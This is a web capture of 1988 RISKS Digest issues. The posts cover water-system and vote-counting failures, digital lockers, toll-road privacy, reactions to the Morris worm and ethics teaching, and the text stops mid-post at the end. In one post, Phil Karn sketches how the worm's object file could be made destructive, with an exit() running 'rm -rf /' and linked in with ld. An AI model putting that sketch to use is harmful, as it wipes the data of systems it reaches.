Computer glitch causes Fresno `flood' 
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Fri, 18 Nov 1988 14:27:22 PST
</i><PRE>

  FRESNO -- The computer that controls the city's water service malfunctioned,
or ``crashed'', three separate times Monday within an hour and a half, causing
at least 12 mains to rupture and damaging nearly 50 residential plumbing
systems.
  The $2.3 million computerized telemetering system, which has been in
operation for only six months, controls 106 water pumps and wells and 877 miles
of piping.
  ... the malfunction -- which centered in a burglar alarm at one of the pumps
-- sent confusing signals to the computer that temporarily shut down the pumps.
  An automatic restart device that shifts the system over to manual controls
sent water pressure levels of up to 75 pounds per square inch surging through
the pipes.  Usually the level ranges from 40 to 45 [ppsi].
  With the computer inoperable, the manual system took over with each pump
operating on its own fixed settings.  ... the settings apparently weren't
properly set and the resulting heavier flow of water proved too much for some
of the city's older mains to handle.
  It also triggered 24 automatic fire alarms ...

[From the San Jose Mercury, 16 November 1988, thanks to Ira Greenberg]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Election Computing
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Fri, 18 Nov 1988 16:03:04 PST
</i><PRE>

A law suit has just been filed in Texas on behalf of the voters of the state
challenging the entire election and requesting not a recount but an entirely
new election.  The grounds are that the State did not follow its own procedures
for certifying the election equipment.  Perhaps one of our Texas readers can
keep us informed of the details.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Re: Vote Count Error
</A>
</H3>
<address>
    Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.MIL">
abc@BRL.MIL
</A>&gt;
</address>
<i>
Thu, 17 Nov 88 11:53:34 EST
</i><PRE>

Re: Kenneth Jongsma's contribution on vote count error.

	Back in 1958 (!), the Black &amp; Decker Co. was converting their
inventory records to an automated (they didn't do "computers" then) system.
Among my duties as a summer student trainee was to copy data from those
dull, yellow inventory cards to forms from which keypunch would be done.

	The chap in charge of the project told us that they would run the
manual and the automated systems in parallel for one full year before
abandoning the manual system.  These folks had a very healthy respect for
"the unknown" and sought to minimize their risks.

        Have we forgotten what we've learned?  In something so important as
an election, why are not the votes counted "manually" as well as by the "new
system" until all the bugs are worked out of things such as Lotus scripts.
It's such a simple idea that we assume it must have occurred to our
political leaders and the Boards of Elections when, in fact, it probably has
not.
                                           _Brint

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Casiers numeriques!  (Digital lockers!)
</A>
</H3>
<address>
Marc Vilain 
&lt;<A HREF="mailto:MVILAIN@G.BBN.COM">
MVILAIN@G.BBN.COM
</A>&gt;
</address>
<i>
Thu 17 Nov 88 14:41:49-EST
</i><PRE>

While in Paris last week, I stopped at the luggage check of the Gare du Nord
train station to drop off a suitcase.  To my great surprise, the familiar
cluncky keyed lockers had been replaced by their gleaming high-tech equivalent.
The French, who so enthusiastically brought us Minitel, now have computerized
luggage lockers.

The basic unit is a block of six lockers which are shut by some kind of servo
latch.  The six lockers share a little keyboard and LED display.  It works like
this: You put your baggage into a free locker, close the door, and drop FF 15
(= $US 3) into a coin slot.  The machine latches your locker door and prints
out a little ticket indicating the identification number of your locker and a
5-digit password, apparently generated at random.  When you want to retrieve
your bags, you key in the password and, voila, the locker door opens up.

The locker system guards fairly well against the most obvious security flaw: a
nefarious individual reading the code on the ticket as it is printed out.  The
ticket is actually printed on a double strip of paper.  The writing only
appears on the inner strip, and you have to peel away the outer one to read the
password.

Throughout my stay in Paris, I wondered how the lockers guarded against a brute
force attack on their password.  I found out as I was retrieving my bags.  Near
me a group of clearly puzzled passengers were trying to collect their own
belongings, and were typing away on the keyboard of their locker.  Suddenly, a
siren sounded from the bowels of the locker, alerting the attendant in charge
of the luggage check -- the befuddled passengers must have typed one password
too many.

Befuddlement, unfortunately, seemed the general response of newcomers to these
clever machines.  I used these lockers several times during my stay, and I
never failed to see perplexed faces staring at the instructions.  Given that
France seems to have pushed computer literacy in a big way recently, one may
view with some degree of pessimism the success of the enterprise.  But perhaps
I should be more charitable -- I too was confused at first. 

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Toll Road information collection
</A>
</H3>
<address>
David Phillip Oster
&lt;<A HREF="mailto:oster@dewey.soe.Berkeley.EDU ">
oster@dewey.soe.Berkeley.EDU 
</A>&gt;
</address>
<i>
17 Nov 88 13:04:08 GMT
</i><PRE>
Organization: School of Education, UC-Berkeley

Many toll roads in the U.S. give you a ticket at the spot you enter the toll
road, and collect the ticket when you leave.  The tickets are stamped with
their origin, so the distance driven can be computed. So far so good.

Is it fair to also stamp the tickets with the time of issue, so if the
distance traveled divided by the time elapsed is greater than the average
speed limit the toll taker can hand you a speeding ticket at the same time?
An appropriate computer would help the toll taker in this task.

Massachusetts has drastically higher fines the faster you go. The above
system can only conclude that your average speed was above the legal limit.

If there is a monitoring system measuring when your car crosses each sensor,
every ten miles say, then the system can draw conclusions about your speed
on the inter-sensor segments of your trip. Segments at 80 mph can be fined
at a much greater rate than those at 60.

Do people have a right to violate the speed laws? If not, should the state
be making investments in speeder catching gear so long as the "take" is more
than the capital cost?

A related question: Where can I buy a radar gun, and how much do they
typically cost? I want to aim one at speeders to make their radar detectors
sound off.

--- David Phillip Oster            --When you asked me to live in sin with you
Arpa: oster@dewey.soe.berkeley.edu --I didn't know you meant sloth.
Uucp: {uwvax,decvax}!ucbvax!oster%dewey.soe.berkeley.edu

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Risks of non-technologists' reactions to technological failures
</A>
</H3>
<address>
&lt;<A HREF="mailto:mccall@skvax2.csc.ti.com">
mccall@skvax2.csc.ti.com
</A>&gt;
</address>
<i>
Fri, 18 Nov 88 17:46:03 CST
</i><PRE>

There seems to be a genuine risk involved with regard to public perceptions
of complex and little understood technologies, in that when the inevitable 
failures occur there is an unthinking overreaction, based, I suppose, upon 
disappointed expectations of perfection in technology.

In the wake of the inevitable failures involving a technology, those who
don't understand the issues are prone to call for sweeping changes to 
'correct the problems'.  This is similar to outcries against 'electric
jets' in the wake of the Airbus crash in France and against NASA after
the Challenger incident (although in my opinion, NASA was more than ripe
for it).

Those who call for the most drastic measures with regard to issues they
know nothing about are often the most adamant in adhering to their 
belief that the 'elite' are really conspiring to cover things up.  

For instance, with regard to the article that follows, when I attempted 
to correct some of the factual errors I found myself subjected to public
abuse.  Pointing out errors in the usage of words with regard to 'virus'
and 'hacker' earned comments about refusing to write to pander to "the 
incestuous coterie of computer insiders" and comments about how the 
perpetrator of this act is really the one to blame and that laws about 
this sort of thing need to be enforced if we're ever going to stop them
rather than simply regarding them as 'pranks' evoked phrases about "the 
neo-fascists of the computing world" and about how enforcing laws isn't 
the solution.

When someone who is a reputable journalist is reacting in this way, what
solutions are there to risks involved in people misunderstanding the
technology and events associated with it?

I wonder how many articles like the following are appearing in various
places around the country in the wake of the Arpanet worm?  The fact that
it's by someone who describes himself as a "technology writer" and 
"computerist" and who is involved in reputable journalism only makes 
the point more strongly.

[Article and the author's online profile follow.]


==============================================================================
| Fred McCall  (mccall@skvax1.ti.com) | My boss doesn't agree with anything  |
| Military Computer Systems           | I say, so I don't think the company  |
| Defense Systems &amp; Electronics Group | does, either.  That must mean I'm    |
| Texas Instruments, Inc.             | stuck with any opinions stated here. |
==============================================================================

================================== ARTICLE ===================================

AL FASOLDT
  
Technology writer (syndicated newspaper columnist) and audio writer (Fanfare
Magazine), newspaper editor in Syracuse, NY (the daily Herald-Journal),
poet, bicyclist, computerist who loves simple programming; a fan of the Atari
ST and no fan at all of MS-DOS computers; 2 grown children.
  
 
1 (of 7) AL FASOLDT Nov. 14, 1988 at 20:48 Eastern (4846 characters)
  
Let's start things off with some thoughts on who is really responsible here.
 
This is an article I wrote for distribution this coming week.
 
AThis can be reproduced in electronic form as long as the text is not altered
and this note remains on top. Distributed by the Technofile BBS.
 
Publication date: Nov. 20, 1988
 
By Al Fasoldt
 
Copyright (C) 1988, The Herald Company, Syracuse, New York
 
 
There's an untold story in the furor over the electronic virus that infected
6,000 mainframe computers across the country earlier this month.
 
Left out of the many accounts of the prank pulled by a Cornell graduate
student is something that could be the single most important issue of computer
networking in the next decade.
 
It is put most simply in the form of a question: Who is in charge of our
mainframe computer networks?
 
In more complete terms, it can be stated this way:  Are we placing too much
trust in the systems managers who run our nation's medium- and large-size
computer systems?
 
I am posing this question for a practical reason, not a theoretical one. Lost
in the furor over the mass electronic break-in is the fact that it could have
been prevented - if the people in charge of the computers had been doing their
job.
 
The hacker, Robert Morris, exploited a weakness in the operating system of
these computer systems. The weakness was known to the operating system's
designers, and the company that supplies the operating system had long ago sent
notices to all its customers explaining how to patch the operating system to
fix the weakness.
 
All these thousands of systems managers had to do was read their mail.
 
Most of them didn't. Most of them ignored the plea from the operating system's
designers to make the fix before someone broke into these computers through
this weak area, called the "back door."
 
There is no other word for this than incompetence. Those who think it's
unlikely that most mainframe computer systems managers are incompetent - at
least in this one area, if in no other - have their heads in the sand.
 
Think of it in terms of human viruses. If doctors throughout the country were
warned of a potentially dangerous weakness in a major drug and most of them did
nothing about it, how forgiving would we be? We would demand that the medical
profession act immediately to remove those doctors who don't have enough sense
to protect the public.
 
Are we going to do the same thing in regard to our systems managers?
 
I'm a realist. I know what the answer is. They'll go on protecting their jobs
by making up excuses. They'll tell the people who hired them that the entire
subject is too technical to explain, but they have the situation well in hand.
 
Bull. Every systems manager who ignored the warnings on the flaws in Unix, the
operating system that Robert Morris sailed right through, should be fired.
 
It's as simple as that. It's time that we treated networked computer systems
seriously. It's time that we stopped accepting the technobabble from these
incompetents as something that no one else can comprehend. The rest of us can
comprehend it just fine, thank you.
 
If you agree, mail a copy of this column to your boss. Send a copy to the
person who hires and fires the systems manager in your company or university.
 
Send 'em a message before another Robert Morris sends them something else.
 
 
*    *    *
 
How can computers catch a virus?
 
It's easy.
 
Keep in mind that a computer works quite a bit like a human being. Both need a
central processor to run properly - a CPU chip in one case and a brain and
central nervous system in the other. And both need the correct programs to work
right - an operating system in the computer and an autonomous set of
instructions to the organs of the body in the human.
 
Each one can get sick when a virus works its way into the system and throws it
off stride. In both the computer and the human, the virus hides itself and
alters the day-to-day operations of its host.
 
In its mildest form, the virus merely slows everything down. The computer
responds sluggishly, and the human feels weak and rundown. At its worst, the
virus can make either type of host so sick that it may not recover without
intensive care.
 
So far, what we have been describing also characterizes a simpler form of
intruder, called a worm. The difference between a worm and a virus is that
worms don't create new copies of themselves, but viruses do; in fact, the
strongest viruses in computers and humans can create new clones of themselves
many times a minute.
 
The major conceptual difference is that human viruses are actual creatures,
and they can sometimes be seen under a microsope. But computer viruses are
formless groups of numbers written as a program. This may make them seem less
harmful than human viruses, but it would be a serious mistake for us to treat
them that way.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.79.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.81.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-33</DOCNO>
<DOCOLDNO>IA012-000131-B035-200</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.81.html 128.240.150.127 19970217024001 text/html 24613
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:38:26 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 81</TITLE>
<LINK REL="Prev" HREF="/Risks/7.80.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.82.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.80.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.82.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 81</H1>
<H2> Monday 21 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computerized voting problems in Toronto 
</A>
<DD>
<A HREF="#subj1.1">
Amit Parghi
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  NH State Republican Convention Computerized Voting Standard 
</A>
<DD>
<A HREF="#subj2.1">
Kurt Hyde
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Ethics 
</A>
<DD>
<A HREF="#subj3.1">
Hugh Miller
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Teaching "Ethics" 
</A>
<DD>
<A HREF="#subj4.1">
Brint Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Decompiled Source 
</A>
<DD>
<A HREF="#subj5.1">
Phil Karn
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Risks of unchecked input in C programs 
</A>
<DD>
<A HREF="#subj6.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Smart Roads 
</A>
<DD>
<A HREF="#subj7.1">
Robert Brooks
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  IFF &amp; UK Toll Roads 
</A>
<DD>
<A HREF="#subj8.1">
Nigel Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: "Electronic number plates" 
</A>
<DD>
<A HREF="#subj9.1">
Allan Pratt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: UK vehicle-identification systems 
</A>
<DD>
<A HREF="#subj10.1">
John Haller
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computerized voting problems in Toronto
</A>
</H3>
<address>
Amit Parghi 
&lt;<A HREF="mailto:aparghi@watcgl.waterloo.edu">
aparghi@watcgl.waterloo.edu
</A>&gt;
</address>
<i>
Sun, 20 Nov 88 18:13:44 EST
</i><PRE>
Organization: Computer Graphics Lab, University of Waterloo

From _The_Globe_and_Mail_, Saturday, 19 November (reprinted w/o permission):
	Machine misses 1,408 votes, Toronto clerk wants recount by Sean Fine

  Toronto's city clerk is asking council to order a city-wide recount after
1,408 votes in Monday's [14 Nov.] civic elections went unread by sophisticated
new machines. [...]  "We want the integrity of the election to be upheld,"
deputy clerk Barbara Caplan said in explaining why all 16 city wards, plus the
Metro Toronto wards and trustee races, should be retabulated.  Ms Caplan said
the recount could affect the outcome of only one city race, the three-vote
victory for reformer Malcolm Martini over conservative Michael Walker in Ward
16.  As well, three school trustee races could be affected.
  But a battle may occur over the manner of the recount.  The clerk's office
wants to give the machines, purchased recently at a cost of $1.6 million
(Canadian), another chance.  Ms Caplan said the computerized vote-counting
machines were not to be faulted.  An error in the printing or cutting of
ballots put them "off- register," or off-line, meaning they could not be
scanned by the machine, she said.  In the recount, those ballots that are not
read by the machine would be tabulated manually, she said.  [...]
  In the city's closest race, which pitted Mr. Walker against Mr.  Martini, Mr.
Walker, a six-year veteran of council, was initially declared the victor Monday
night.  On Wednesday, the clerk's department discovered errors in manual
addition and Mr. Martini emerged the winner by three votes.  Now the entire
ward race is in question since 81 ballots were not read by the machine. [...]
  In no other city ward, and in none of the eight Metro wards located in the
City of Toronto, was the margin of victory smaller than the number of unread
ballots.  The number of ballots not read ranged from a low of 47 in Ward 4 to a
high of 237 in Ward 12.  [...]
  Under law, the ballots would have to be read in the same fashion - that is,
by the machines - as on election day, Ms Caplan said.  Only those ballots
rejected by the machines would be read manually.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 NH State Republican Convention Computerized Voting Standard Resolution
</A>
</H3>
<address>
Have Rdb Manuals -- Will Travel 264-3839 MKO1-1/B02
&lt;<A HREF="mailto:hyde%isws23.DEC@decwrl.dec.com ">
hyde%isws23.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Mon, 21 Nov 88 12:32:19 PST
</i><PRE>

The following resolution was the only proposed resolution which passed at this
year's New Hampshire State Republican Convention:

   WHEREAS The State of New Hampshire has set  no  minimum  standard  for
   computer security in computerized voting, and

   WHEREAS The  state  of  the  art  in  computer  crime  has  progressed
   dramatically in the last few years to now include virus programs which
   can transmit themselves from one computer to  another  without  active
   participation by the computers' owners, operators, or users, and

   WHEREAS The State of New Hampshire has computerized voting  equipment,
   some of which:

    o  Does not have the ability to recount manually,

    o  Does not have the ability to recount at all,

    o  Uses  secrecy  of  internal  procedures  as  a  primary   security
       strategy,

    o  Does not give the voter the ability to  ensure  the  computer  has
       voted as instructed,

   NOW THEREFORE, BE IT RESOLVED that the Republican Party of  the  State
   of  New  Hampshire  calls  upon  the  Legislature  of the State of New
   Hampshire to enact legislation  that  would  establish  the  following
   minimum  computer  security  features  for  any  further  expansion of
   computerized voting or vote counting:

      Computerized  voting  equipment  must  either  produce  a  manually
      recountable   ballot   for   the   voter's   inspection   prior  to
      electronically casting the voter's ballot or use  as  its  input  a
      ballot which can be used in a manual recount.

Submitted by Kurt Hyde, Delegate from Weare.

This proposed standard is essentially the same one proposed at the first
National Symposium on Security and Reliability of Computers in the Electoral
Process at Boston University in August of 1986 (Co-chaired by Eva Waskell and
myself).

Many thanks to  the  RISKS  Forum  members  who  participated  in  the
development of this standard during 1985 and 1986.
                                                              Kurt

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
     Ethics
</A>
</H3>
<address>
Hugh Miller 
&lt;<A HREF="mailto:MILLER@vm.epas.utoronto.ca">
MILLER@vm.epas.utoronto.ca
</A>&gt;
</address>
<i>
Wed, 16 Nov 88 23:39:09 EST
</i><PRE>

     Stan Stahl, in RISKS 7.75, writes:

&gt; The critical bottom line, and it is one that shouts out to us in the
&gt; wake of the RTM worm, is that we absolutely must begin to take the
&gt; teaching of ethics seriously.  Some school districts are beginning to do
&gt; this and they are to be commended for it.  Perhaps if everyone were
&gt; exposed to ethics courses, beginning in the early grades and continuing
&gt; through computer ethics courses and business ethics courses, etc, then
&gt; it would be clear `in the entire community what is and what isn't
&gt; ethical behavior.'

     In my experience teaching ethics here and at McGill
University, such courses have little direct effect on the moral
behaviour of the students taking them.  About all that can be
expected -- and this is the *maximal* result -- is that the
students will be made aware of one more set of constraints they
must operate within: a code of professional ethics.  (In those
states which permit them.  Many don't.)  Like all such codes, the
extent to which they are taken seriously has much more to do with
upbringing, personality, generally accepted broad social norms,
peer pressure, etc., than with schooltime pedagogy.  Clever
people, or persons thinking themselves above or outside the
rules, always find excuses for circumventing them.  Scientific
pursuits in general, and mathematical/logical ones in particular,
due to the glamour and the cachet of difficulty attached to them,
encourage adepts in such beliefs.  The famous technological
imperative is at work as well: do what is "technically sweet"
first, and ask whether it was good after all once it's done.  The
novelist Walker Percy in one of his books quotes "a scientist's
prayer, if scientists ever prayed, which they don't: `Lord, grant
that my work lead to the betterment of the human condition, and
not the reverse.  Failing that, Lord, let it not lead to the
complete destruction of mankind.  And, failing that, Lord, please
don't let the end come before my article is published in
*Brain*.'"  And, frankly, the general culture we live in worships
at the  altar of Expediency, not Justice or Virtue, so one cannot
expect much help there.
     Further, most `ethics' instruction at the university level
with which I am familiar proceeds along lines so shallow and
analytical that it completely fails to engage the spirit of the
listener.  One doesn't have to be a devotee of Allan Bloom or his
ilk to see this.  However dedicated and forceful the teacher, the
material taught is so unchallenging and `conservative' (in the
sense of supporting the *status quo*) that even the very young
see through it and hit their mental channel-changers.  To explain
why this is so would require a long discussion, descending
occasionally into rant and tirade, of the practice of moral
philosophy in the English-speaking world in the 20th century, the
which I will spare us all.  Suffice it to say, the first ethics
course most students take is, in my overwhelming experience, the
last.
     This is not to say that I oppose teaching ethics.
Obviously, if such teaching does nothing more than lower the rate
of mischief in general circulation by a little bit it is A Good
Thing.  I merely wish to point out the limitations of all such
pedagogy.  The teacher in *Stand And Deliver*, please note, was
NOT teaching ethics.

Hugh Miller, University of Toronto, MILLER@UTOREPAS.BITNET

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Re: Teaching "Ethics"
</A>
</H3>
<address>
    Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.MIL">
abc@BRL.MIL
</A>&gt;
</address>
<i>
Thu, 17 Nov 88 11:58:50 EST
</i><PRE>

Eric Roskos writes,

&gt; In an Ethics course, the most you can do is discuss ethical paradigms, which
&gt; include systems of ethics in which it is entirely acceptable to engage in any
&gt; activity that benefits you ("situation ethics" are an example of this).

We're missing something in this discussion.  A few digests back, someone
observed that post-Watergate attorneys began taking ethics courses as part of
their training.  But I don't believe for a moment that the purpose was to
"teach" ethics to the attorneys.  It was simply to get on the record that the
attorney had studied ethics so that he could not later claim ignorance of
ethical concepts or their irrelevance to his/her professional conduct.  By
this, ethical considerations can now legitimately be raised in disciplinary
proceedings.

It may come down to this in Computing Science as well.
                                                            _Brint

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Decompiled Source (Re: <A HREF="/Risks/7.79.html">RISKS-7.79</A>)
</A>
</H3>
<address>
Phil Karn
&lt;<A HREF="mailto:karn@ka9q.bellcore.com ">
karn@ka9q.bellcore.com 
</A>&gt;
</address>
<i>
Thu, 17 Nov 88 13:02:35 EST
</i><PRE>

Some argue that the decompiled source code to the Internet worm shouldn't be
released because that would make it easier for someone to turn it into
something really damaging.

This is a specious argument.  Anyone can modify the worm's object file into
something very malevolent, and it doesn't even require the use of adb. Just
write an exit() that actually does "rm -rf /" followed by an infinite loop,
and link it to the worm object file using ld -r so it can be the subject of
another ld run.  I simply refuse to believe that I'm the only person to
think of something like this.

The only "sensitive" information contained in the worm source is the
security holes it exploits, and these are now very widely known.  The worm
is completely powerless without them, and you don't need the worm to exploit
in much worse ways a system that still has the holes. On the other hand,
there are a lot of people who have perfectly legitimate reasons for wanting
to see that code.  I, for one, would very much like to show my management
and our security staff exactly what it did (*and* did not) do.  Although I
personally have no reason to believe that the analysis prepared at MIT and
Berkeley is not complete, it is just not the same thing as having the actual
source in hand when trying to reduce the general paranoia level in others.

Phil

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Risks of unchecked input in C programs
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sat, 19 Nov 88 00:22:36 EST
</i><PRE>

A small error of fact in Bill Stewart's contribution:

&gt;I've always been dissatisfied with the printf/scanf family - field widths are
&gt;hard-coded in the format strings, with no way to parameterize them except
&gt;building format strings on the fly...

Not true, and it hasn't been true for a long time.  A field width or
precision specification of '*' means "pick up an integer from the parameter
list at this point".  Either Bill has a very strange version of Unix or he
just missed this in the manual page -- it's been there at least since V7,
which came out nearly ten years ago.

                                     Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Smart Roads
</A>
</H3>
<address>
Robert Brooks 
&lt;<A HREF="mailto:rb%hpda@sde.hp.com">
rb%hpda@sde.hp.com
</A>&gt;
</address>
<i>
Fri, 18 Nov 88 15:35:22 pst
</i><PRE>

Many articles have appeared recently about "smart roads"; systems in which
communication of some sort between roads and vehicles enable such things
as automatic toll assessment, route planning, traffic jam avoidance, etc.
Much concern has been expressed about the Big Brother potential of such
systems.  But this is by no means an essential hazard.  The transponders,
barcode tags, or whatever could be purchased anonymously, and authorization
to cross various toll points n times purchased in advance, like postage
stamps.  Attempting to pass without prepaid authorization triggers a
buzzer, light, gate, or something directing one to a conventional toll
booth.  Those who proceed anyway are chased down like someone who goes
through an ordinary toll booth without paying.

Any technological advance is greeted by cries of "it won't work" and
irrational fears.  Smart roads are no exception.  We should indeed protest
implementations of the technology which are invasive to privacy, but
suppress Luddite urgings to abandon it altogether.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
IFF &amp; UK Toll Roads
</A>
</H3>
<address>
Nigel Roberts, G4IJF
&lt;<A HREF="mailto:roberts%untada.DEC@decwrl.dec.com ">
roberts%untada.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
17 Nov 88 17:25
</i><PRE>

IFF (Identification Friend or Foe) and Toll Roads in the UK

Fitting IFF to cars

  Chaz Heritage and others raise genuine concerns about the possibilities for
intentional and unintentional misuse of such a hypothetical system.
  However I do feel some of the more fantastic possibilities are unlikely to
materialise. (Of course other risks, maybe with even worse consequences than
already imagined might, so don't stop discussing this!)

European Single Market

  From 1992, all goods sold in the Single Market must conform to common
specifications. As a result, National Type Approval for cars will be replaced
by a type approval for the whole of the EEC. (This, in fact will apply to all
goods &amp; services, but we are discussing cars here)
  For example, the U.K. would like to introduce a requirement for U.S. style
third brake lights. However before it can do this, it needs all the other
member countries to agree.
  So to REQUIRE the fitting of an IFF-style device, it must be agreed by all
the EEC countries (and it must then conform to a common standard).

  The British consumer may in its lethargy accept Big Brother, but here in W.
Germany there would be a revolution if such an intrusion into privacy was even
so much as suggested. (There was enough outcry when machine-readable
passports/national ID cards were introduced; this was somewhat pacified by
removing the requirement to carry I.D. at all times)

Foreign Vehicles

  The number of foreign registered (usually European) vehicles on British roads
is increasing all the time, with the increase in contacts, trade, etc, with the
mainland which has occurred since the U.K. joined the EEC in 1973.

When the Chunnel opens there will be even more.

  The U.K like most countries. is bound by the terms of the Treaties on
International Road Traffic to let visitors to the U.K. drive on their roads. If
the Essex Police got a MAIL message every time a car without a U.K. IFF plate
drove along the A12 (a major 'E' route) then their computer systems would soon
be overloaded.

Simple ways are best

  As a final postscript on the theme of "Big Brother is watching you"; let me
ask the rhetorical question:

    "Why use complicated methods of control when simple ones are best?".

  An example: all vehicles loading on to one particular ferryboat are monitored
by video as they pass Passport Control.
  Presumably, during the crossing, a list of all license plates can be made,
and telexed across to the destination port.
  What could be simpler than that? Why use complicated electronics when old-
fashioned surveillance works just as well, if not better.
                                                                 Nigel Roberts

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: "Electronic number plates"
</A>
</H3>
<address>
Allan Pratt
&lt;<A HREF="mailto:imagen!atari!apratt@ucbvax.Berkeley.EDU ">
imagen!atari!apratt@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Fri, 18 Nov 88 14:40:59 pst
</i><PRE>
Organization: Atari (US) Corporation, Sunnyvale, California

I saw a segment on "Electronic number plates" on "Beyond 2000" (or "Towards
2000"), a series from Australia which actually goes into more detail than most
